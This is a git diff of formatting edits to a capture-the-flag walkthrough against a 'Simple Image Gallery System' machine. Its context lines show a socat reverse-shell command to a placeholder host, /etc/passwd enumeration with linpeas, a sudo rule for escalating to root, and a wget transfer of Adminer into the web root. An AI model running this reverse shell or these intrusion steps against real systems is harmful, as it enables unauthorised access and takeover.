@@ -19,7 +19,6 @@ We are provided with the IP of the machine.
 &nbsp;&nbsp;Basic port scan shows that there are two open ports on the machine.
 
 ```
-Not shown: 998 closed tcp ports (conn-refused)
 PORT     STATE SERVICE VERSION
 80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
 |_http-server-header: Apache/2.4.29 (Ubuntu)
@@ -48,7 +47,6 @@ PORT     STATE SERVICE VERSION
 
 Searching the title *Simple Image Gallery System* on google shows that it is an open source image manager that works on **php** and **SQL**.
 
-<br>
 
 ### Login
 
@@ -86,9 +84,9 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ip>:<port>
 
 ## Machine
 
-We get the shell as the user www-data.
+We get the shell as the user `www-data`.
 
-Checking the /etc/passwd shows that we have these users
+Checking the /etc/passwd shows that we have three more users
 ```
 1. mike
 2. ubuntu
@@ -96,7 +94,8 @@ Checking the /etc/passwd shows that we have these users
 ```
 
 To enumerate the machine I have used [linpeas](https://linpeas.sh)
-Here there is an interesting result
+
+Here is an interesting result
 
 <img src="./images/linpeas.png" width="500">
 
@@ -126,7 +125,7 @@ User mike may run the following commands on gallery:
     (root) NOPASSWD: /bin/bash /opt/rootkit.sh
 ```
 
-here the user mike can run the script ***rootkit.sh*** as root.
+here the user mike can run the script `rootkit.sh` as root.
 Checking the script shows this..
 ```
 #!/bin/bash
@@ -205,7 +204,8 @@ if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
 So to get it we can use `mysql` on machine.
 But here I have used [Adminer](https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php) which is a GUI for SQL DataBase in a single file.
 
-I have hosted this file on my http server and used wget to tranfer it to `/var/www/html` directory
+I have hosted this file on my http server and used wget to tranfer it to `/var/www/html` directory.
+
 Then I have accessed this from the webpage
 
 <img src="./images/adminer.png" width="300">
